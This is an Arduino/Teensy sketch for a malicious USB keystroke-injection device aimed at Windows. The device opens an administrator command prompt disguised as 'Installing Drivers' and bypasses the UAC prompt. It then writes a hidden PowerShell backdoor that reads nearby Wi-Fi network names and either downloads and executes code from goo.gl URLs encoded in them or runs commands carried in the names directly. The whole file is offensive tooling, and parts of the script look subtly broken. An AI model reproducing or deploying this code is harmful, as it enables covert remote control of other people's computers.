#define TEENSY2
#ifdef TEENSY2
    #include<usb_private.h>
#endif

void setup(){

  delay(3000);
  wait_for_drivers(2000);

  minimise_windows();
  delay(500);
  while(!cmd_admin(3,500))
  {
  reset_windows_desktop(2000);
  }

  Keyboard.println("echo while($True){ > %temp%\\gt.ps1");
  Keyboard.println("echo $nws = iex \"netsh wlan show network\" >> %temp%\\gt.ps1");
  Keyboard.println("echo $ssid = $nws | Select-String \"SSID\" >> %temp%\\gt.ps1");
  Keyboard.println("echo $nwnms = $ssid -replace \".*:\" -replace \" \" >> %temp%\\gt.ps1");
  Keyboard.println("echo ForEach ($nw in $nwnms){ >> %temp%\\gt.ps1");
  Keyboard.println("echo if ($nw.Substring(0,4) -match look.Substring(0,4)){ >> %temp%\\gt.ps1");
  Keyboard.println("echo if ($network.Substring(4)[0] -eq \"u\"){ >> %temp%\\gt.ps1");
  Keyboard.println("echo $PURL = \"http://goo.gl/\" + $nw.Substring(5) >> %temp%\\gt.ps1");
  Keyboard.println("echo $wc = New-Object System.Net.WebClient >> %temp%\\gt.ps1");
  Keyboard.println("echo iex $wc.DownloadString($PURL) >> %temp%\\gt.ps1");
  Keyboard.println("echo if (null -ne "null") {iex $argm} >> %temp%\\gt.ps1");
  Keyboard.println("echo Start-Sleep 10} >> %temp%\\gt.ps1");
  Keyboard.println("echo elseif ($network.Substring(4)[0] -eq \"c\"){ >> %temp%\\gt.ps1");
  Keyboard.println("echo $cmd =  $nw.Substring(5) >> %temp%\\gt.ps1");
  Keyboard.println("echo if ($cmd -eq \"exit\"){break} >> %temp%\\gt.ps1");
  Keyboard.println("echo iex $cmd > %temp%\\gt.ps1");
  Keyboard.println("echo Start-Sleep 10}}} >> %temp%\\gt.ps1");
  Keyboard.println("echo Start-Sleep 5} >> %temp%\\gt.ps1");
  Keyboard.println("echo Set oShell = CreateObject(\"WScript.Shell\") > %temp%\\gt.vbs");
  Keyboard.println("echo oShell.Run(\"powershell.exe -ep bypass -nologo -c %temp%\\gt.ps1\"),0,true >> %temp%\\gt.vbs");
  delay(1000);
  Keyboard.println("wscript %temp%\\gt.vbs");
  delay(3000);
  Keyboard.println("exit");

}

void loop(){
}

void wait_for_drivers(int sleep)
{
bool CapsLockTrap = is_caps_on();
while(CapsLockTrap == is_caps_on())
{
Keyboard.set_key1(KEY_CAPS_LOCK);
Keyboard.send_now();
delay(200);
Keyboard.set_modifier(0);
Keyboard.set_key1(0);
Keyboard.send_now();
delay(500);
delay(sleep);
}
Keyboard.set_key1(KEY_CAPS_LOCK);
Keyboard.send_now();
delay(200);
Keyboard.set_modifier(0);
Keyboard.set_key1(0);
Keyboard.send_now();
delay(500);
delay(sleep);
}

int ledkeys(void) {return int(keyboard_leds);}

bool is_caps_on(void) {return ((ledkeys() & 2) == 2) ? true : false;}

bool cmd_admin(int reps, int millisecs)
{
make_sure_capslock_is_off();
delay(700);
Keyboard.set_modifier(MODIFIERKEY_RIGHT_GUI);
Keyboard.send_now();
Keyboard.set_modifier(0);
Keyboard.send_now();
delay(3000);
Keyboard.print("cmd /T:01 /K \"@echo off && mode con:COLS=15 LINES=1 && title Installing Drivers\"");
delay(2000);
Keyboard.set_modifier(MODIFIERKEY_CTRL);
Keyboard.send_now();
Keyboard.set_modifier(MODIFIERKEY_CTRL | MODIFIERKEY_SHIFT);
Keyboard.send_now();
Keyboard.set_key1(KEY_ENTER);
Keyboard.send_now();
delay(200);
Keyboard.set_modifier(0);
Keyboard.set_key1(0);
Keyboard.send_now();
delay(500);
delay(7000);
send_left_enter();
delay(4000);
create_click_capslock_win();
check_for_capslock_success_teensy(reps,millisecs);
}

bool cmd(int reps, int millisecs, char *SomeCommand)
{
make_sure_capslock_is_off();
delay(700);
Keyboard.set_modifier(MODIFIERKEY_RIGHT_GUI);
Keyboard.set_key1(KEY_R);
Keyboard.send_now();

delay(500);
Keyboard.set_modifier(0);
Keyboard.set_key1(0);
Keyboard.send_now();

Keyboard.print(SomeCommand);
Keyboard.set_key1(KEY_ENTER);
Keyboard.send_now();

Keyboard.set_key1(0);
Keyboard.send_now();

delay(3000);
create_click_capslock_win();
check_for_capslock_success_teensy(reps,millisecs);
}

void make_sure_capslock_is_off(void)
{
if (is_caps_on())
{
delay(500);
Keyboard.set_key1(KEY_CAPS_LOCK);
Keyboard.send_now();
delay(200);
delay(700);
Keyboard.set_modifier(0);
Keyboard.set_key1(0);
Keyboard.send_now();
delay(500);
delay(700);
}
}

void create_click_capslock_win()
{
Keyboard.println("echo Set WshShell = WScript.CreateObject(\"WScript.Shell\"): WshShell.SendKeys \"{CAPSLOCK}\" > %temp%\\capslock.vbs");
delay(400);
Keyboard.println("wscript %temp%\\capslock.vbs");
delay(2000);
}

bool check_for_capslock_success_teensy(int reps, int millisecs)
{
unsigned int i = 0;
do
{
delay(millisecs);
if (is_caps_on())
{
make_sure_capslock_is_off();
delay(700);
return true;
}
i++;
}
while (!is_caps_on() && (i<reps));
return false;
}

void minimise_windows(void)
{
Keyboard.set_modifier(MODIFIERKEY_RIGHT_GUI);
Keyboard.set_key1(KEY_M);
Keyboard.send_now();
delay(300);
Keyboard.set_modifier(0);
Keyboard.set_key1(0);
Keyboard.send_now();
delay(500);
delay(300);
}

void reset_windows_desktop(int sleep)
{
delay(1000);
minimise_windows();
delay(sleep);
minimise_windows();
delay(sleep);
minimise_windows();
delay(200);
}

void send_left_enter(){
  delay(1000);
  Keyboard.set_key1(KEY_LEFT);
  Keyboard.send_now();
  delay(100);
  Keyboard.set_key1(0);
  Keyboard.send_now();

  Keyboard.set_key1(KEY_ENTER);
  Keyboard.send_now();
  delay(100);
  Keyboard.set_key1(0);
  Keyboard.send_now();
  }

